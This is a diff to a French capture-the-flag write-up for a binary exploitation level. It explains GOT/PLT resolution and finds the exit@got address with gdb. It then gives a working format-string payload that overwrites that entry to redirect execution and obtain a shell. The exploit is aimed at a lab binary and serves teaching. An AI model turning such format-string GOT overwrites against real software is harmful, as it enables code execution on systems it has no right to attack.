@@ -1,18 +1,26 @@
-Cet exercice reprend exactement le principe du précédent, mais l'on effectue une redirection du exit@got.
-GOT fonctionne un peu comme la libc ou les adrresses des fonctions sont stockes en dur.
+Cet exercice reprend exactement le principe du précédent, mais l'on effectue une redirection du exit@got.\
+La Global Offset Table (GOT) ainsi que la Procedure Linkage Table (PLT) servent à résoudre des adresses dans des librairies dynamiques.
+La PLT fonctionne comme un proxy:
+  - elle charge une adresse qui est celle contenu dans la GOT
+  - si l'adresse est une adresse de relocation, la librairie n'est pas chargée, elle demande donc à la charger
+  - elle appellel'adresse réelle de nouveau dans la GOT
 
-Pour faire la redirection du exit, on doit d'abord le trouver, pour cela on va suivre l'exit de la fonction n et a la fin on obtient:
+[Voir plus ici](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
 
-```(gdb) x 0x8049838
+Pour faire la redirection du exit, on doit d'abord le trouver, pour cela on va suivre l'exit de la fonction `n`, et à la fin on obtient:
+
+```
+(gdb) x 0x8049838
 0x8049838 <exit@got.plt>:       0x080483d6
 ```
 
-On doit maintenant écrire `134513828` dans `0x08049838`.
+On doit maintenant écrire l'adresse de `o`, `0x080484A4` (`134513828` en décimal) dans `0x08049838`.
 
-Pour trouver l'offset on fait un ```AAAA%p%p%p%p%...```
-et on voit que l'ecriture se fait a la position 4.
+Pour trouver l'offset on fait un `AAAA%p%p%p%p%...` et on voit que l'ecriture se fait a la position 4, car il y a une répétition de 41 (char code de A) à cet endroit.
 
 Voici le nouveau code :
 ```bash
-(echo $'\x38\x98\x04\x08%134513824d%4$n';cat) | ./level5
+(echo $'\x38\x98\x04\x08%134513824d%4$n'; cat) | ./level5
 ```
+
+We can add ` | tr -d ' '` at the end to avoid waiting.
